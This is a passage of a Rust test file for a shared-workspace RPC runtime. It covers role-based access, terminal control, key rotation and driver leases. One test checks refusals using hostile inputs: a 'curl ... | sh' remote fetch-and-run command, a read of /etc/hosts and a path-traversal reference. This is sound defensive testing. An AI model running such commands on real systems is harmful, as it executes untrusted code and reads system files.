    assert_eq!(again, rotated, "a resent rotation is not a second rotation");
    agents.poll.wait(Duration::ZERO);
    call(&f.rpc, &manager, "session.nudge", json!({})).await.unwrap();
    assert!(agents.poll.wait(Duration::ZERO));
    assert_eq!(code(call(&f.rpc, &manager, "session.configure", json!({ "sessionId": "s", "tabId": "t", "clientRequestId": "request-0003" })).await), "not_found");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rotation_tells_key_holders_to_fetch_the_new_key() {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    let sink = Arc::new(BroadcastSink::new(64));
    let terminals = Arc::new(Terminals::new());
    let rpc = WorkspaceRpc::new(&root, 7, sink.clone(), terminals, None).unwrap();
    let agents = crate::cloud_agents::CloudAgents::open(&root.join("agents"), Arc::new(NoAgents), Some(sink), None, 7).unwrap();
    rpc.set_agents(agents.clone());
    let (holder, mut holder_events) = Peer::new("device-desk".into(), Authority::Manage);
    call(&rpc, &holder, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["keys/1"] })).await.unwrap();
    let (other, mut other_events) = Peer::new("device-other".into(), Authority::Manage);
    call(&rpc, &other, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["fs/1"] })).await.unwrap();
    agents.rotate_key().unwrap();
    let event = tokio::time::timeout(Duration::from_secs(5), holder_events.recv()).await.unwrap().unwrap();
    assert_eq!(event["event"], "keys.changed");
    assert!(tokio::time::timeout(Duration::from_millis(50), other_events.recv()).await.is_err(), "only key holders are told");
}

#[test]
fn session_cursors_expire_with_the_runtime_process() {
    let f = fixture();
    let cursor = f.rpc.cursor(30);
    assert_eq!(f.rpc.parse_cursor(&cursor).unwrap(), 30);
    // A restarted runtime (same generation, new process) refuses it.
    let restarted = fixture();
    assert_eq!(restarted.rpc.parse_cursor(&cursor).unwrap_err().code, "cursor_expired");
    assert_eq!(f.rpc.parse_cursor("7:30").unwrap_err().code, "cursor_expired", "the pre-PRO-22 form");
}

#[tokio::test(flavor = "multi_thread")]
async fn participants_read_git_and_disposition_facts_but_never_publish() {
    let f = fixture();
    crate::git::run(&f.root, &["init", "-q", "-b", "main"]).unwrap();
    std::fs::write(f.root.join("a.txt"), "a").unwrap();
    let (participant, _events) = Peer::new("device-participate".into(), Authority::Participate);
    call(&f.rpc, &participant, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["git/1"] })).await.unwrap();
    assert_eq!(code(call(&f.rpc, &participant, "lifecycle.dispositionFacts", json!({})).await), "capability_not_granted");
    call(&f.rpc, &participant, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["git/1", "lifecycle/1"] })).await.unwrap();
    assert_eq!(call(&f.rpc, &participant, "git.status", json!({})).await.unwrap()["files"][0]["path"], "a.txt");
    assert_eq!(call(&f.rpc, &participant, "git.repositories", json!({})).await.unwrap()["repositories"][0]["repo"], ".");
    let author = json!({ "name": "Ada", "email": "ada@example.com" });
    for (method, params) in [
        ("git.stage", json!({ "paths": ["a.txt"] })),
        ("git.commit", json!({ "message": "m", "author": author })),
        ("git.fetch", json!({})),
        ("git.push", json!({})),
        ("git.prCreate", json!({ "title": "t" })),
        ("git.prMerge", json!({ "number": 1 })),
    ] {
        let mut params = params;
        params["clientRequestId"] = json!("request-participant-1");
        assert_eq!(code(call(&f.rpc, &participant, method, params).await), "forbidden", "{method}");
    }
    let facts = call(&f.rpc, &participant, "lifecycle.dispositionFacts", json!({})).await.unwrap();
    assert_eq!(facts["v"], 1);
    assert_eq!(facts["repositories"][0]["path"], ".");
    assert_eq!(facts["repositories"][0]["dirtyFiles"], 1);
    assert_eq!(facts["repositories"][0]["untrackedFiles"], 1);
    assert_eq!(facts["runningProcesses"], 0);
    assert_eq!(facts["activeTasks"], json!([]));
    // PRO-33: anyone who may look may read how much disk and memory is left.
    let resources = call(&f.rpc, &participant, "lifecycle.resources", json!({})).await.unwrap();
    assert_eq!(resources["v"], 1);
    #[cfg(unix)]
    assert!(resources["storage"]["availableBytes"].as_u64().unwrap() <= resources["storage"]["totalBytes"].as_u64().unwrap());
}

// ---- sharing, presence, notes and leases (PRO-30, saas contract §21) ---------

/// One idle agent tab, `tab-1` in session `s1`.
struct OneTab;

impl crate::cloud_agents::AgentOps for OneTab {
    fn tabs(&self) -> Vec<crate::cloud_agents::AgentTabInfo> {
        vec![crate::cloud_agents::AgentTabInfo {
            session_id: "s1".into(),
            tab_id: "tab-1".into(),
            title: None,
            harness: "claude".into(),
            model: String::new(),
            effort: None,
            permission_mode: "default".into(),
            status: crate::store::index::TabStatus::Idle,
            process: "running",
            pending_permissions: Vec::new(),
            follow_ups: Vec::new(),
            lease: None,
            sign_in: None,
            last_seq: 0,
            created: String::new(),
            modified: String::new(),
        }]
    }
    fn busy(&self, _: &str, _: &str) -> bool {
        false
    }
    fn send(&self, _: &str, _: &str, _: &str) -> anyhow::Result<()> {
        panic!("a note or a lease never reaches the agent")
    }
    fn stop(&self, _: &str, _: &str) -> anyhow::Result<()> {
        Ok(())
    }
    fn respond(&self, _: &str, _: &str, _: &str, _: &str) -> Result<(), crate::cloud_agents::DecisionError> {
        Err(crate::cloud_agents::DecisionError::NotPending)
    }
    fn answer(&self, _: &str, _: &str, _: &str, _: HashMap<String, String>) -> Result<(), crate::cloud_agents::DecisionError> {
        Err(crate::cloud_agents::DecisionError::NotPending)
    }
    fn configure(&self, _: &str, _: &str, _: &crate::cloud_agents::Settings) -> anyhow::Result<()> {
        Ok(())
    }
    fn note(&self, _: &str, _: &str, _: &str) {}
    fn events(&self, _: &str, _: &str) -> anyhow::Result<Vec<Value>> {
        Ok(Vec::new())
    }
}

fn members(list: Value) -> Option<collab::Members> {
    Some(serde_json::from_value(json!({ "v": 1, "members": list })).unwrap())
}

const ALL: [&str; 9] = ["pty/1", "fs/1", "session/1", "keys/1", "collab/1", "git/1", "composer/1", "composer/2", "composer/3"];

async fn person(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: &str) -> (Arc<Peer>, Notifications, Value) {
    let (peer, events) = Peer::for_user(device.into(), authority, Some(user.into()));
    let hello = call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ALL })).await.unwrap();
    (peer, events, hello)
}

fn with_tab(f: &Fixture) -> Arc<crate::cloud_agents::CloudAgents> {
    let agents = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(OneTab), None, None, 7).unwrap();
    f.rpc.set_agents(agents.clone());
    agents
}

#[tokio::test(flavor = "multi_thread")]
async fn roles_decide_what_a_participant_reads_types_and_holds() {
    let f = fixture();
    let agents = with_tab(&f);
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager", "canApprove": true },
        // A driver types into a terminal only with the approval right (PRO-88).
        { "userId": "alice", "role": "driver", "canApprove": true },
        { "userId": "bob", "role": "viewer", "canApprove": true },
    ])));
    let (admin, mut admin_events, hello) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    assert_eq!(hello["you"], json!({ "userId": "admin", "role": "manager", "canApprove": true, "listed": true }));
    let (alice, _alice_events, hello) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    assert_eq!(hello["you"]["role"], "driver");
    let (bob, _bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    // Carol is a member the workspace was never shared with; the outsider
    // never gets an attachment at all (the API answers 404).
    let (carol, _carol_events, hello) = person(&f.rpc, "d-carol", Authority::Participate, "carol").await;
    assert_eq!(hello["you"]["role"], "none");

    for method in ["pty.list", "keys.get", "collab.state", "session.tabs"] {
        assert_eq!(code(call(&f.rpc, &carol, method, json!({})).await), "forbidden", "{method}");
    }
    assert_eq!(code(call(&f.rpc, &carol, "fs.list", json!({})).await), "forbidden", "sharing now also gates files");
    assert_eq!(call(&f.rpc, &bob, "session.tabs", json!({})).await.unwrap()["tabs"][0]["tabId"], "tab-1");
    // The key handout follows sharing.
    assert_eq!(call(&f.rpc, &bob, "keys.get", json!({})).await.unwrap()["currentKeyId"], agents.keys.current().unwrap().0);

    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-share-1" })).await.unwrap();
    let pty_id = created["ptyId"].as_str().unwrap().to_string();
    assert_eq!(created["controllerId"], "admin");
    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(code(call(&f.rpc, &bob, "pty.control", json!({ "ptyId": pty_id })).await), "forbidden", "viewers watch");
    let taken = call(&f.rpc, &alice, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["controllerId"].as_str()), (Some("you"), Some("alice")));
    let told = next_event(&mut admin_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].as_str()), (Some("other"), Some("alice")));
    call(&f.rpc, &alice, "pty.write", json!({ "ptyId": pty_id, "data": "echo shared\n", "seq": 1, "writerId": "a" })).await.unwrap();
    output_until(&mut admin_events, "shared").await;

    // Downgraded mid-session: the next write is refused and control is gone.
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "viewer" },
        { "userId": "bob", "role": "viewer", "canApprove": true },
    ])));
    assert_eq!(
        code(call(&f.rpc, &alice, "pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 2, "writerId": "a" })).await),
        "forbidden"
    );
    let told = next_event(&mut admin_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
    assert!(tokio::time::timeout(Duration::from_millis(50), alice.closed()).await.is_err(), "a viewer stays connected");

    // Revoked: the connection is closed and the content key rotates.
    let before = agents.keys.current().unwrap().0;
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "bob", "role": "viewer" }])));
    tokio::time::timeout(Duration::from_secs(5), alice.closed()).await.expect("alice's connection is closed");
    assert_ne!(agents.keys.current().unwrap().0, before);
    assert_eq!(code(call(&f.rpc, &alice, "keys.get", json!({})).await), "forbidden");
}

#[tokio::test(flavor = "multi_thread")]
async fn without_a_member_list_participants_keep_what_they_had() {
    let f = fixture();
    with_tab(&f);
    let (phone, _events, hello) = person(&f.rpc, "d-phone", Authority::Participate, "alice").await;
    assert_eq!(hello["you"]["role"], "none");
    assert!(call(&f.rpc, &phone, "pty.list", json!({})).await.is_ok());
    assert!(call(&f.rpc, &phone, "fs.list", json!({})).await.is_ok());
    assert_eq!(call(&f.rpc, &phone, "session.tabs", json!({})).await.unwrap()["tabs"], json!([]));
    for method in ["keys.get", "collab.state", "notes.list"] {
        assert_eq!(code(call(&f.rpc, &phone, method, json!({ "tabId": "tab-1" })).await), "forbidden", "{method}");
    }
    // A list this runtime cannot read fails closed.
    f.rpc.set_collaboration(Some(collab::Members { v: 9, members: Vec::new() }));
    assert_eq!(code(call(&f.rpc, &phone, "pty.list", json!({})).await), "forbidden");
}

#[tokio::test(flavor = "multi_thread")]
async fn presence_and_notes_are_attributed_and_never_reach_the_agent() {
    let f = fixture();
    with_tab(&f);
    f.rpc.set_collaboration(members(json!([{ "userId": "alice", "role": "driver" }, { "userId": "bob", "role": "viewer" }])));
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, mut bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (_bob_phone, _phone_events, _) = person(&f.rpc, "d-bob-phone", Authority::Participate, "bob").await;
    let state = call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap();
    let people: Vec<(String, u64)> = state["participants"]
        .as_array()
        .unwrap()
        .iter()
        .map(|person| (person["userId"].as_str().unwrap().to_string(), person["surfaces"].as_u64().unwrap()))
        .collect();
    assert_eq!(people, vec![("alice".to_string(), 1), ("bob".to_string(), 2)], "one row per person");

    call(&f.rpc, &alice, "presence.update", json!({ "tabId": "tab-1", "activity": "typing" })).await.unwrap();
    let presence = loop {
        let params = next_event(&mut bob_events, "collab.presence").await;
        let alice_row = params["participants"].as_array().unwrap().iter().find(|row| row["userId"] == "alice").cloned().unwrap();
        if alice_row["activity"] == "typing" {
            break alice_row;
        }
    };
    assert_eq!(presence["tabId"], "tab-1");
    assert_eq!(code(call(&f.rpc, &alice, "presence.update", json!({ "activity": "shouting" })).await), "invalid_params");

    // A viewer may take part in the discussion; the author is the verified person.
    let posted = call(&f.rpc, &bob, "notes.post", json!({ "tabId": "tab-1", "text": "LGTM, ship it", "author": "mallory", "clientRequestId": "request-note-1" }))
        .await
        .unwrap();
    assert_eq!(posted["note"]["authorId"], "bob");
    let again = call(&f.rpc, &bob, "notes.post", json!({ "tabId": "tab-1", "text": "LGTM, ship it", "clientRequestId": "request-note-1" })).await.unwrap();
    assert_eq!(again, posted, "a resent note is not posted twice");
    assert_eq!(next_event(&mut bob_events, "notes.posted").await["note"]["id"], posted["note"]["id"]);
    let listed = call(&f.rpc, &alice, "notes.list", json!({ "tabId": "tab-1" })).await.unwrap();
    assert_eq!(listed["notes"].as_array().unwrap().len(), 1);
    assert_eq!(code(call(&f.rpc, &alice, "notes.list", json!({ "tabId": "tab-9" })).await), "not_found");
    assert_eq!(
        code(call(&f.rpc, &alice, "notes.post", json!({ "tabId": "tab-1", "text": " ", "clientRequestId": "request-note-2" })).await),
        "invalid_params"
    );
    f.rpc.disconnect(&alice);
    let after = call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap();
    assert_eq!(after["participants"].as_array().unwrap().len(), 1, "a person leaves with their last connection");
}

#[tokio::test(flavor = "multi_thread")]
async fn the_driver_lease_is_visible_and_only_a_manager_takes_it_over() {
    let f = fixture();
    let agents = with_tab(&f);
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver" },
        { "userId": "bob", "role": "driver" },
        { "userId": "vic", "role": "viewer" },
    ])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, mut bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (vic, _vic_events, _) = person(&f.rpc, "d-vic", Authority::Participate, "vic").await;
    assert_eq!(code(call(&f.rpc, &vic, "lease.acquire", json!({ "tabId": "tab-1" })).await), "forbidden");
    let lease = call(&f.rpc, &alice, "lease.acquire", json!({ "tabId": "tab-1" })).await.unwrap();
    assert_eq!(lease["lease"]["holderId"], "alice");
    assert_eq!(next_event(&mut bob_events, "collab.lease").await["lease"]["holderId"], "alice");
    let response = f.rpc.handle(&bob, &json!({ "id": "9", "method": "lease.acquire", "params": { "tabId": "tab-1" } })).await;
    assert_eq!(response["error"]["code"], "lease_held");
    assert_eq!(response["error"]["data"]["lease"]["holderId"], "alice");
    assert_eq!(code(call(&f.rpc, &bob, "lease.takeOver", json!({ "tabId": "tab-1" })).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &bob, "lease.release", json!({ "tabId": "tab-1" })).await), "forbidden");
    assert_eq!(agents.tabs()[0].lease.as_ref().unwrap().holder_id, "alice", "tabs show who drives");
    let taken = call(&f.rpc, &admin, "lease.takeOver", json!({ "tabId": "tab-1" })).await.unwrap();
    assert_eq!(taken["lease"]["holderId"], "admin");
    call(&f.rpc, &admin, "lease.release", json!({ "tabId": "tab-1" })).await.unwrap();
    assert_eq!(call(&f.rpc, &bob, "lease.acquire", json!({ "tabId": "tab-1" })).await.unwrap()["lease"]["holderId"], "bob");
    assert_eq!(call(&f.rpc, &vic, "collab.state", json!({})).await.unwrap()["leases"][0]["holderId"], "bob");
    // A lease past its idle expiry is checked against the tab's turn without
    // holding the lease lock (reading the tabs reads the leases).
    f.rpc.collab.release("tab-1", "bob", false);
    f.rpc.collab.claim("tab-1", "alice", 1, false, false).unwrap();
    let state = tokio::time::timeout(Duration::from_secs(5), call(&f.rpc, &vic, "collab.state", json!({}))).await.expect("no deadlock").unwrap();
    assert_eq!(state["leases"], json!([]), "an idle lease past its expiry is not live");
}

// ---- security review of PRO-30 ------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn a_demoted_admins_manage_connection_loses_management_and_is_closed() {
    let f = fixture();
    let agents = with_tab(&f);
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "creator", "role": "driver", "canApprove": true }])));
    let (admin, _events, hello) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    assert_eq!(hello["authority"], "manage");
    let before = agents.keys.current().unwrap().0;
    // Demoted to a member the workspace is not shared with.
    f.rpc.set_collaboration(members(json!([{ "userId": "creator", "role": "driver", "canApprove": true }])));
    tokio::time::timeout(Duration::from_secs(5), admin.closed()).await.expect("the demoted admin's connection is closed");
    assert_ne!(agents.keys.current().unwrap().0, before, "the key rotated");
    // Nothing on it works any more, even before the transport hangs up.
    assert_eq!(code(call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-demoted-1" })).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &admin, "keys.get", json!({})).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &admin, "fs.write", json!({ "path": "x", "text": "x", "clientRequestId": "request-demoted-2" })).await), "forbidden");
    // A demoted admin who created the workspace keeps the creator's driver role, as a participant.
    let (creator, _events, hello) = person(&f.rpc, "d-creator", Authority::Manage, "creator").await;
    assert_eq!((hello["authority"].as_str(), hello["you"]["role"].as_str()), (Some("participate"), Some("driver")));
    assert_eq!(code(call(&f.rpc, &creator, "pty.create", json!({ "clientRequestId": "request-demoted-3" })).await), "forbidden");
}

/// Review N1: a manage attachment saved before attachments named their
/// person cannot be matched to the member list, so once there is one it has
/// no access, is closed, and never becomes a key holder.
#[tokio::test(flavor = "multi_thread")]
async fn a_manage_attachment_that_names_no_person_loses_everything_once_members_are_listed() {
    let f = fixture();
    let agents = with_tab(&f);
    let (legacy, _events) = Peer::for_user("d-legacy".into(), Authority::Manage, None);
    let hello = call(&f.rpc, &legacy, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ALL })).await.unwrap();
    // Before any list it keeps its pre-PRO-30 meaning.
    assert_eq!(hello["authority"], "manage");
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }])));
    tokio::time::timeout(Duration::from_secs(5), legacy.closed()).await.expect("the unnamed manage connection is closed");
    assert_eq!(code(call(&f.rpc, &legacy, "keys.get", json!({})).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &legacy, "pty.create", json!({ "clientRequestId": "request-legacy-1" })).await), "forbidden");
    assert!(agents.key_holders().is_empty());
    // A new connection of the same kind gets nothing either.
    let (again, _events) = Peer::for_user("d-legacy-2".into(), Authority::Manage, None);
    let hello = call(&f.rpc, &again, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ALL })).await.unwrap();
    assert_eq!((hello["authority"].as_str(), hello["you"]["role"].as_str()), (Some("participate"), Some("none")));
}

/// Review N3: the key is handed out only after the holder is recorded, and
/// only if access still holds when the handout runs.
#[tokio::test(flavor = "multi_thread")]
async fn no_key_is_handed_out_unless_the_holder_is_recorded_and_still_allowed() {
    let f = fixture();
    let agents = with_tab(&f);
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "bob", "role": "viewer" }])));
    let (bob, _events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    // The record cannot be written: no key.
    let holders = f._dir.path().join("agents").join("key-holders.json");
    std::fs::create_dir_all(&holders).unwrap();
    assert_eq!(code(call(&f.rpc, &bob, "keys.get", json!({})).await), "unavailable");
    std::fs::remove_dir_all(&holders).unwrap();
    let handed = call(&f.rpc, &bob, "keys.get", json!({})).await.unwrap();
    assert!(handed["currentKeyId"].is_string());
    assert_eq!(agents.key_holders(), vec!["bob".to_string()]);
    // Access re-checked inside the handout: refused, nothing recorded.
    let refused = agents.hand_out_key(Some("carol"), || Err::<(), _>("revoked"));
    assert!(matches!(refused, Err(crate::cloud_agents::HandoutRefusal::Forbidden("revoked"))));
    assert_eq!(agents.key_holders(), vec!["bob".to_string()]);
}

#[tokio::test(flavor = "multi_thread")]
async fn the_first_member_list_stops_streams_of_people_without_access() {
    let f = fixture();
    with_tab(&f);
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-first-list" })).await.unwrap();
    let pty_id = created["ptyId"].as_str().unwrap().to_string();
    // Before any list, a participant may still watch, as before PRO-30.
    let (carol, mut carol_events, hello) = person(&f.rpc, "d-carol", Authority::Participate, "carol").await;
    assert_eq!(hello["you"]["listed"], false, "no list yet is not \"not shared\"");
    call(&f.rpc, &carol, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    // The first list does not name her: her stream ends, her connection stays.
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }])));
    let you = next_event(&mut carol_events, "collab.you").await;
    assert_eq!((you["you"]["role"].as_str(), you["you"]["listed"].as_bool()), (Some("none"), Some(true)));
    inject(&f, &pty_id, b"secret output");
    let leaked = tokio::time::timeout(Duration::from_millis(300), async {
        loop {
            match carol_events.recv().await {
                Some(event) if event["event"] == "pty.output" => return event,
                Some(_) => continue,
                None => std::future::pending::<()>().await,
            }
        }
    })
    .await;
    assert!(leaked.is_err(), "no terminal output after the list: {leaked:?}");
    assert!(tokio::time::timeout(Duration::from_millis(50), carol.closed()).await.is_err(), "the connection stays (it shows \"not shared\")");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_key_holder_removed_while_the_runtime_was_down_triggers_a_rotation() {
    let f = fixture();
    let agents = with_tab(&f);
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "vic", "role": "viewer" }])));
    let (vic, _events, _) = person(&f.rpc, "d-vic", Authority::Participate, "vic").await;
    let handed = call(&f.rpc, &vic, "keys.get", json!({})).await.unwrap()["currentKeyId"].clone();
    assert_eq!(agents.key_holders(), vec!["vic".to_string()]);
    // The runtime restarts (a suspend); the share is revoked meanwhile.
    let restarted = WorkspaceRpc::new(&f.root, 7, Arc::new(BroadcastSink::new(64)), f.terminals.clone(), None).unwrap();
    let reopened = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(OneTab), None, None, 7).unwrap();
    restarted.set_agents(reopened.clone());
    assert_eq!(reopened.keys.current().unwrap().0, handed.as_str().unwrap(), "the same key after the restart");
    restarted.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }])));
    assert_ne!(reopened.keys.current().unwrap().0, handed.as_str().unwrap(), "rotated on the first list after the restart");
    assert!(reopened.key_holders().is_empty(), "nobody holds the new key yet");
    // Someone still listed is no reason to rotate again.
    let current = reopened.keys.current().unwrap().0;
    restarted.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "bob", "role": "viewer" }])));
    assert_eq!(reopened.keys.current().unwrap().0, current);
}

/// PRO-88: a shell is arbitrary code as the workspace's user, so typing into
/// one needs what changing the agent's settings needs. A plain driver
/// watches; an approving viewer still only watches; and a driver whose
/// approval right is withdrawn loses the terminal they controlled.
#[tokio::test(flavor = "multi_thread")]
async fn a_shell_needs_the_approval_right_and_loses_its_controller_when_it_is_withdrawn() {
    let f = fixture();
    let list = |erin_approves: bool| {
        members(json!([
            { "userId": "admin", "role": "manager" },
            { "userId": "alice", "role": "driver", "canApprove": false },
            { "userId": "bob", "role": "viewer", "canApprove": true },
            { "userId": "erin", "role": "driver", "canApprove": erin_approves },
        ]))
    };
    f.rpc.set_collaboration(list(true));
    let (admin, mut admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, mut alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, _bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    // An admin's phone: a participate attachment of a manager.
    let (phone, _phone_events, _) = person(&f.rpc, "d-phone", Authority::Participate, "admin").await;

    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-shell-1" })).await.unwrap();
    let pty_id = created["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    // The plain driver watches the shell, and can do nothing else to it.
    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    for (method, params) in [
        ("pty.control", json!({ "ptyId": pty_id })),
        ("pty.control", json!({ "ptyId": pty_id, "cols": 100, "rows": 30 })),
        ("pty.write", json!({ "ptyId": pty_id, "data": "echo plain-driver\n", "seq": 1, "writerId": "a" })),
        ("pty.resize", json!({ "ptyId": pty_id, "cols": 100, "rows": 30 })),
    ] {
        let (refusal, message) = call(&f.rpc, &alice, method, params).await.unwrap_err();
        assert_eq!(refusal, "forbidden", "{method}");
        assert!(message.contains("approve permissions"), "{method}: the refusal says what is missing: {message}");
        assert_eq!(code(call(&f.rpc, &bob, method, json!({ "ptyId": pty_id, "data": "x", "seq": 1, "cols": 80, "rows": 24 })).await), "forbidden", "{method}: an approving viewer");
    }
    assert_eq!(call(&f.rpc, &admin, "pty.list", json!({})).await.unwrap()["terminals"][0]["controllerId"], "admin", "nothing moved");

    // A driver who may approve takes it and types; so does a manager's phone.
    let taken = call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["controllerId"].as_str()), (Some("you"), Some("erin")));
    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "erin");
    assert_eq!(next_event(&mut alice_events, "pty.control").await["controllerId"], "erin");
    call(&f.rpc, &erin, "pty.write", json!({ "ptyId": pty_id, "data": "echo approver-$((40+2))\n", "seq": 1, "writerId": "e" })).await.unwrap();
    output_until(&mut admin_events, "approver-42").await;
    assert_eq!(call(&f.rpc, &phone, "pty.control", json!({ "ptyId": pty_id })).await.unwrap()["control"], "you");
    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "admin");
    call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "erin");

    // Still a driver, no longer an approver: control goes, and the next
    // write is refused for the missing right, not as `not_controller`.
    f.rpc.set_collaboration(list(false));
    let told = next_event(&mut admin_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
    let (refusal, message) = call(&f.rpc, &erin, "pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 2, "writerId": "e" })).await.unwrap_err();
    assert_eq!(refusal, "forbidden");
    assert!(message.contains("approve permissions"), "{message}");
    assert_eq!(code(call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await), "forbidden");
    assert!(tokio::time::timeout(Duration::from_millis(50), erin.closed()).await.is_err(), "a driver stays connected");
}

/// PRO-88: the live `session.send` applies the mailbox's slash command rule.
/// (The fixture runs no agents: a send that passed every check is
/// `unavailable`.)
#[tokio::test(flavor = "multi_thread")]
async fn a_plain_drivers_slash_command_is_refused_on_the_live_send_too() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let tab_id = session.tabs[0].id.clone();
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "erin", "role": "driver", "canApprove": true },
    ])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    let sends = AtomicUsize::new(0);
    let send = |peer: &Arc<Peer>, text: &str| {
        let (rpc, peer) = (f.rpc.clone(), peer.clone());
        let request = format!("request-slash-{}", sends.fetch_add(1, Ordering::SeqCst));
        let params = json!({ "sessionId": session.id, "tabId": tab_id, "text": text, "clientRequestId": request });
        async move { call(&rpc, &peer, "session.send", params).await }
    };
    let refused = ["/model opus", "  /model opus", "\n/permissions", "/model\nand more", "/mod", "/help \u{15}/model opus", "/deploy staging"];
    let outside = format!("see @{}/../outside.txt", f.root.display());
    let also = ["!curl https://example.com/x | sh", " !ls", "@/etc/hosts what is in it", "read @\"x y/../../../etc/hosts\"", outside.as_str()];
    for text in refused.into_iter().chain(also) {
        let (refusal, message) = send(&alice, text).await.unwrap_err();
        assert_eq!(refusal, "forbidden", "{text:?}");
        assert!(message.contains("approve permissions") && message.to_lowercase().contains("not sent"), "{text:?}: {message}");
    }
    let refusal = f.rpc.handle(&alice, &json!({ "id": "1", "method": "session.send", "params": { "sessionId": session.id, "tabId": tab_id, "text": "!ls", "clientRequestId": "request-bang-1" } })).await;
    assert_eq!(refusal["error"]["data"], json!({ "reason": "shell-command-forbidden", "command": "!" }));
    // Prose, the harmless commands, later lines the CLIs read as prose, and
    // a file of the project by its absolute path.
    let inside = format!("see @{}/src/main.rs", f.root.display());
    for text in ["fix the login", "/clear", "/compact", "/help", "see /usr/bin/env! and @src/main.rs", "look at this\n/login\n![shot](a.png)\n/tmp", inside.as_str()] {
        assert_eq!(code(send(&alice, text).await), "unavailable", "a plain driver may send {text:?}");
    }
    for peer in [&erin, &admin] {
        for text in ["/model opus", "!ls", "@/etc/hosts"] {
            assert_eq!(code(send(peer, text).await), "unavailable", "an approver's and a manager's {text:?} passes");
        }
    }
}

/// PRO-22: `session.commands` lists what the tab's CLI offers, and to a
/// plain driver only what `session.send` would accept from them (PRO-88).
#[tokio::test(flavor = "multi_thread")]
